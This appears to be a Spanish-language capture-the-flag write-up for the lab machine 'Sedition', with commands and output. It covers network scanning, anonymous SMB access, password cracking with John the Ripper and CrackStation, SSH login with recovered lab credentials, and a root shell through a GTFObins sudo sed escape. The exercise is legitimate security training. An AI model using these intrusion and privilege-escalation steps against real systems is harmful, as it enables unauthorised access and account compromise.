# Sedition (TheHackerLabs)
## ⚙️ Herramientas utilizadas
- Arp-scan
- Nmap
- SMBClient
- JohnTheRipper
- RPCClient
- CrackStation
- GTFObins


## Reconocimiento
### Arp-scan
```bash 
sudo arp-scan -I eth0 --localnet
```

```text 
192.168.1.108   08:00:27:60:6a:ed       (Unknown)
```
- Resultado -> la ip víctima es 192.168.1.108

### Ping
```bash
ping -c 1 192.168.1.108
```
```text
PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
64 bytes from 192.168.1.108: icmp_seq=1 ttl=64 time=1.63 ms
```
- Resultado -> ttl=64, por lo que es una máquina linux.
### Nmap
Lanzamos un nmap completo para comprobar los puertos abiertos:
```bash
nmap -p- -sS -sC -sV --open --min-rate=5000 -n -vvv -Pn 192.168.1.108 -oN escaneo.txt
```
- Resultado -> puerrtos abiertos 139 y 445 (SMB) y 65535:

```text
Nmap scan report for 192.168.1.108
Host is up, received arp-response (0.00024s latency).
Scanned at 2025-07-14 17:08:52 CEST for 13s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4
65535/tcp open  ssh         syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG/Kzfk09iAKKpRuJrSfx4A4WiSlvP++mk2g5NcP7Bfva4A0l0SZxeDNKXB6iJN1++qyQWE2OUVzLrZ8Gdjkn+M=
|   256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvZ909p40dk+Vi+xYHAfVXI4wI0XGPS/fgHXpFI2mRP
MAC Address: 08:00:27:60:6A:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-07-14T15:09:04
|_  start_date: N/A
| nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SEDITION<00>         Flags: <unique><active>
|   SEDITION<03>         Flags: <unique><active>
|   SEDITION<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58844/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 27853/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57010/udp): CLEAN (Failed to receive data)
|   Check 4 (port 56717/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

### 🚨 ¿Puerto 65535 abierto?
Esto no es común. El puerto 65535 (el más alto del rango TCP) suele estar cerrado. Si está abierto y no se identifica el servicio (unknown), es muy probable que sea:
- Un servicio personalizado o camuflado (por ejemplo, un SSH oculto)

### SMBClient
```bash
smbclient -L 192.168.1.108 -N
```
Resultado:
```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
backup          Disk      
IPC$            IPC       IPC Service (Samba Server)
nobody          Disk      Home Directories
```

Probar acceso sin contraseña a los recursos interesantes:
```bash
smbclient //192.168.1.108/nobody -N
```

Resultado:
```text
smbclient //192.168.1.108/nobody -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Ahrora probamos con backup:
```bash
smbclient //192.168.1.108/backup -N
smb: \> ls
  secretito.zip                       N      216  Sun Jul  6 19:02:31 2025
```

Descargamos secretito.zip:
```bash
get secretito.zip
```

Descomprimimos la carpeta secretito.zip pero nos pide contraseña:
```text
unzip secretito.zip
Archive:  secretito.zip
[secretito.zip] password password:
```

### JohnTheRipper
Crackeamos la contraseña con JohnTheRipper.
Sacamos el hash:
```bash
zip2john secretito.zip > hash
```
```text
$ cat hash       
secretito.zip/password:$pkzip$1*2*2*0*22*16*f2e5967a*0*42*0*22*969d*ee16b094213a1612e10c6608d4c2a170383b6b429176dfb6baac253a70a84e202ae7*$/pkzip$:password:secretito.zip::secretito.zip
```

Le pasamos el rockyou.txt para buscar la contraseña del hash:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
<img width="610" height="141" alt="image" src="https://github.com/user-attachments/assets/2cab4a37-06c3-4a8d-82ba-3e2c00962304" /><br>

Descomprimimos secretito.zip:

<img width="412" height="134" alt="image" src="https://github.com/user-attachments/assets/7a53eccd-e428-4089-9d86-c37f30b6229b" /><br>

Leemos password:
```bash
$ cat password 
elbunkermolagollon123
```
- Tenemos una contraseña.

### RPCClient
Buscamos usuarios:
```bash
rpcclient -U "" -N 192.168.1.108
querydispinfo
```

<img width="521" height="77" alt="image" src="https://github.com/user-attachments/assets/7520fc4a-94e2-4e54-9493-8bd3e8f3616e" /><br>

Encontramos el usuario cowboy.

### Puerto 65535 (SSH)
Ahora que tenemos un user y una password probamos a conectarnos al puerto 65535 (ssh):
```bash
ssh cowboy@192.168.1.108 -p 65535
```

<img width="629" height="298" alt="image" src="https://github.com/user-attachments/assets/c69af493-bfd5-45e4-a199-1f4ef0f2678c" /><br>

## Escalada de privilegios
Una vez dentro intentamos conseguir usuario root.

<img width="397" height="107" alt="image" src="https://github.com/user-attachments/assets/888092b3-fd85-4f76-a1a0-63474ad75223" /><br>

- Leemos .bash_history:

<img width="282" height="83" alt="image" src="https://github.com/user-attachments/assets/e0d39d92-03c1-45d6-b5f7-cf9b3f5ab03e" /><br>


Hay una BD, nos conectamos:
```bash
mariadb -u cowboy -pelbunkermolagollon123
```

<img width="526" height="534" alt="image" src="https://github.com/user-attachments/assets/1af83f2f-4cbb-49e4-add4-c36a5b6ce33f" /><br>

Está hasheada la contraseña, la crackeamos:
```bash
debian:7c6a180b36896a0a8c02787eeafb0e4c
```

Entramos en CrackStation:

<img width="689" height="250" alt="image" src="https://github.com/user-attachments/assets/028751b5-41d7-458e-903c-4716375d17f2" /><br>


Nos conectamos al usuario debian y comprobamos si podemos ejecutar algún comando como root:
```bash
sudo -l
```

<img width="770" height="83" alt="image" src="https://github.com/user-attachments/assets/0bfbce27-6f77-4c1a-8694-998af818f662" /><br>


Buscamos en GTFObins:

<img width="547" height="135" alt="Captura de pantalla 2025-07-14 184446" src="https://github.com/user-attachments/assets/df927c12-d817-48e0-bfe6-6959bffc0903" /><br>

Lanzamos el comando:
```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

<img width="399" height="55" alt="Captura de pantalla 2025-07-14 184446" src="https://github.com/user-attachments/assets/ba1e37d4-1088-4f78-9262-a156c1b2aa5f" /><br>


## Flags
Flag usuario:
```bash
/home/debian/flag.txt
```

Flag root:
```bash
/root/root.txt
```
